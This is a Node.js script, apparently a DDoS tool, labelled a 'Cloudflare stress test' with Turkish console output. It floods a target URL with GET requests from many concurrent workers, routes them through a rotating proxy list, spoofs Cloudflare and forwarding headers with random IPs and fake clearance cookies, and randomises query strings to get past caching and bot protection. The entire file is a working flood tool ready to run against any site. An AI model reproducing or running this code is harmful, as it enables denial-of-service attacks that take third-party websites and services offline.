// Genisys

const http = require('http');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const { URL } = require('url');

class AdvancedCloudflareBypasser {
    constructor(targetUrl, durationSec, rateLimit, threadCount, proxyFile) {
        this.targetUrl = targetUrl;
        this.duration = durationSec;
        this.rateLimit = rateLimit; 
        this.threads = threadCount;
        this.proxyFile = proxyFile;
        this.active = true;
        this.proxies = [];
        this.proxyIndex = 0;
        this.requestCount = 0;
        this.successCount = 0;
        this.failCount = 0;
    }

    _getRandomUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    _generateCFHeaders(host, path, ip, userAgent) {
        const sessionId = crypto.randomBytes(32).toString('hex');
        const timestamp = Date.now();
        const randomNonce = crypto.randomBytes(16).toString('base64');
        
        return {
            'Host': host,
            'User-Agent': userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Sec-Ch-Ua': '"Google Chrome";v="120", "Not_A Brand";v="8"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Cookie': `__cfduid=${sessionId}; _cfuvid=${sessionId}; cf_clearance=${crypto.randomBytes(40).toString('hex')}; __cflb=${crypto.randomBytes(16).toString('hex')}`,
            'CF-Connecting-IP': ip,
            'CF-IPCountry': 'TR',
            'CF-Ray': `${crypto.randomBytes(8).toString('hex')}-IST`,
            'CF-Visitor': '{"scheme":"https"}',
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'True-Client-IP': ip,
            'X-Request-ID': crypto.randomBytes(16).toString('hex'),
            'X-Nonce': randomNonce,
            'X-Timestamp': timestamp.toString()
        };
    }

    _generateAttackPath(basePath) {
        const attackVectors = [
            `${basePath}?${crypto.randomBytes(32).toString('hex')}=${crypto.randomBytes(16).toString('hex')}`,
            `${basePath}?nocache=${Date.now()}&rand=${Math.random()}`,
            `${basePath}?id=${crypto.randomInt(1, 9999999)}&session=${crypto.randomBytes(16).toString('hex')}`,
            `${basePath}?search=${encodeURIComponent('x'.repeat(1024))}`,
            `${basePath}?callback=jQuery${crypto.randomInt(1000000, 9999999)}_${Date.now()}`,
            `${basePath}?q=${crypto.randomBytes(50).toString('hex')}`,
            `${basePath}?__cf_chl_jschl_tk__=${crypto.randomBytes(32).toString('hex')}`,
            `${basePath}/cdn-cgi/challenge-platform/h/g/jsch/${crypto.randomBytes(16).toString('hex')}`,
            `${basePath}/.well-known/cf-cgi/${crypto.randomBytes(24).toString('hex')}`
        ];
        return attackVectors[Math.floor(Math.random() * attackVectors.length)];
    }

    async _loadProxies() {
        try {
            const data = fs.readFileSync(this.proxyFile, 'utf8');
            const lines = data.split('\n');
            for (const line of lines) {
                const trimmed = line.trim();
                if (trimmed && trimmed.includes(':')) {
                    const [ip, port] = trimmed.split(':');
                    if (ip && port) {
                        this.proxies.push({ ip, port: parseInt(port) });
                    }
                }
            }
            console.log(`[+] ${this.proxies.length} proxy yüklendi`);
            return this.proxies.length > 0;
        } catch(e) {
            console.log(`[-] Proxy dosyası okunamadı: ${e.message}`);
            return false;
        }
    }

    _getNextProxy() {
        if (this.proxies.length === 0) return null;
        const proxy = this.proxies[this.proxyIndex % this.proxies.length];
        this.proxyIndex++;
        return proxy;
    }

    async _sendRequestViaProxy(urlObj, proxy) {
        return new Promise((resolve) => {
            const isHttps = urlObj.protocol === 'https:';
            const host = urlObj.hostname;
            const port = urlObj.port || (isHttps ? 443 : 80);
            const basePath = urlObj.path || '/';
            const path = this._generateAttackPath(basePath);
            const randomIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
            const userAgent = this._getRandomUserAgent();
            
            const headers = this._generateCFHeaders(host, path, randomIP, userAgent);
            
            const proxyOptions = {
                hostname: proxy.ip,
                port: proxy.port,
                method: 'GET',
                path: `${urlObj.protocol}//${host}${path}`,
                headers: headers,
                timeout: 8000,
                rejectUnauthorized: false,
                agent: false
            };

            const requester = isHttps ? https : http;
            const req = requester.request(proxyOptions, (res) => {
                let data = '';
                res.on('data', (chunk) => { data += chunk; });
                res.on('end', () => {
                    this.requestCount++;
                    if (res.statusCode === 200 || res.statusCode === 403 || res.statusCode === 503) {
                        this.successCount++;
                        resolve(true);
                    } else {
                        this.failCount++;
                        resolve(false);
                    }
                });
            });

            req.on('error', () => {
                this.failCount++;
                resolve(false);
            });
            
            req.on('timeout', () => {
                req.destroy();
                this.failCount++;
                resolve(false);
            });
            
            req.setTimeout(6000);
            req.end();
        });
    }

    async _sendDirectRequest(urlObj) {
        return new Promise((resolve) => {
            const isHttps = urlObj.protocol === 'https:';
            const port = urlObj.port || (isHttps ? 443 : 80);
            const host = urlObj.hostname;
            const basePath = urlObj.path || '/';
            const path = this._generateAttackPath(basePath);
            const randomIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
            const userAgent = this._getRandomUserAgent();
            
            const headers = this._generateCFHeaders(host, path, randomIP, userAgent);
            
            const options = {
                hostname: host,
                port: port,
                path: path,
                method: 'GET',
                headers: headers,
                timeout: 8000,
                rejectUnauthorized: false,
                keepAlive: true
            };

            const protocol = isHttps ? https : http;
            const req = protocol.request(options, (res) => {
                res.resume();
                this.requestCount++;
                if (res.statusCode === 200 || res.statusCode === 403) {
                    this.successCount++;
                } else {
                    this.failCount++;
                }
                resolve(true);
            });

            req.on('error', () => {
                this.failCount++;
                resolve(false);
            });
            
            req.on('timeout', () => {
                req.destroy();
                this.failCount++;
                resolve(false);
            });
            
            req.setTimeout(6000);
            req.end();
        });
    }

    async _attackWorker(urlObj) {
        const requestsPerSecond = this.rateLimit / this.threads;
        const delayBetweenRequests = 1000 / (requestsPerSecond || 1);
        
        while (this.active) {
            const startTime = Date.now();
            
            // Paralel istek gönder
            const promises = [];
            const batchSize = Math.min(5, Math.ceil(requestsPerSecond));
            
            for (let i = 0; i < batchSize; i++) {
                const proxy = this._getNextProxy();
                if (proxy) {
                    promises.push(this._sendRequestViaProxy(urlObj, proxy));
                } else {
                    promises.push(this._sendDirectRequest(urlObj));
                }
            }
            
            await Promise.all(promises);
            
            const elapsed = Date.now() - startTime;
            const waitTime = Math.max(0, delayBetweenRequests - elapsed);
            if (waitTime > 0) {
                await new Promise(r => setTimeout(r, waitTime));
            }
        }
    }

    async _statsReporter() {
        const startTime = Date.now();
        while (this.active) {
            await new Promise(r => setTimeout(r, 5000));
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const rps = Math.floor(this.requestCount / Math.max(1, elapsed));
            console.log(`[STATS] Süre: ${elapsed}s | Toplam: ${this.requestCount} | Başarılı: ${this.successCount} | Başarısız: ${this.failCount} | RPS: ${rps} | Proxy: ${this.proxyIndex}`);
        }
    }

    async start() {
        const url = new URL(this.targetUrl);
        console.log(`\n[=== CLOUDFLARE STRESS TEST ===]`);
        console.log(`[+] Hedef: ${this.targetUrl}`);
        console.log(`[+] Süre: ${this.duration} saniye`);
        console.log(`[+] Rate Limit: ${this.rateLimit} istek/saniye`);
        console.log(`[+] Thread: ${this.threads}`);
        console.log(`[+] Proxy Dosyası: ${this.proxyFile}`);
        
        const hasProxies = await this._loadProxies();
        if (!hasProxies) {
            console.log(`[-] Proxy bulunamadı, direct istek gönderilecek`);
        }
        
        setTimeout(() => {
            this.active = false;
            const finalRPS = Math.floor(this.requestCount / this.duration);
            console.log(`\n[=== TEST TAMAMLANDI ===]`);
            console.log(`[+] Toplam İstek: ${this.requestCount}`);
            console.log(`[+] Başarılı: ${this.successCount}`);
            console.log(`[+] Başarısız: ${this.failCount}`);
            console.log(`[+] Ortalama RPS: ${finalRPS}`);
            process.exit(0);
        }, this.duration * 1000);
        
        this._statsReporter();
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this._attackWorker(url));
        }
        
        await Promise.all(workers);
    }
}

const args = process.argv.slice(2);
if (args.length < 5) {
    console.log('[!] Kullanım: node test.js <hedef_site> <saniye> <rate> <threads> <proxy.txt>');
    console.log('[!] Örnek: node test.js https://example.com 60 1000 250 proxy.txt');
    process.exit(1);
}

const target = args[0];
const duration = parseInt(args[1]);
const rate = parseInt(args[2]);
const threads = parseInt(args[3]);
const proxyFile = args[4];

const tester = new AdvancedCloudflareBypasser(target, duration, rate, threads, proxyFile);
tester.start().catch(console.error);